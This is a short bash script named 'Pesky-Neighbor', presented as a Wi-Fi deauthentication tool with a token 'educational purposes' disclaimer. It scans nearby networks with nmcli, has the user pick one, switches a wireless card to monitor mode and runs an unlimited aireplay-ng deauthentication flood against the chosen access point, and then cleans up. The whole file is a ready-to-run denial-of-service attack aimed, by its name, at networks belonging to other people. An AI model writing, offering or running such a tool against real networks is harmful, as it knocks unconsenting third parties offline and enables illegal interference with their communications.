#!/bin/bash
clear
echo "
=============================================================
Script: Pesky-Neighbor    | this is only for educational
Description: Deauth tool  | purposes. YAKM0 is not 
Author: YAKM0             | responsible for damages.
Email: YAKM0@pm.me        | Drink all the beer, 
Twitter: @Y4KM0           | hack all the things. -dualcore
=============================================================
"
mon='mon'
sleep 5
clear


nmcli dev wifi | awk '$2 != "--"' |awk '{print $1,$2,$4}' | awk -F : '$2!="" && $3!=""' | awk '{print NR,$1,$2,$3}' > input.txt
echo "========================================================================================"
nmcli dev wifi | awk '$2 != "--"' |awk '{print $1,$2,$4}' | awk -F : '$2!="" && $3!=""' | awk '{print NR,$1,$2,$3}'
echo "========================================================================================"
echo "which network would you like to deauth? (type number on left)"
read num
head -n $num input.txt | tail -1 > input2.txt
Bssid=$(cat input2.txt | awk '{print $2}')
chan=$(cat input2.txt | awk '{print $4}')
ssid=$(cat input2.txt | awk '{print $3}')
while true; do
    read -p "You chose $ssid, is this correct? " yp
    case $yp in
        [Yy]* ) break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done

clear
ifconfig
echo "You must start an interface in managed mode, ex. wlan0. Type which interface you want to start in managed mode below:"
read interface
while true; do
    read -p "You chose $interface, is this correct? " yn
    case $yn in
        [Yy]* ) break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done
sudo airmon-ng start $interface > /dev/null 2>&1
clear
sudo timeout 2s airodump-ng -d $Bssid -c $chan $interface$mon > /dev/null 2>&1
sudo aireplay-ng -0 0 -a $Bssid $interface$mon --ignore-negative-one
sleep 3
clear
echo "Returning to managed mode"
sleep 2
sudo airmon-ng stop $interface$mon > /dev/null 2>&1
rm -rf input*
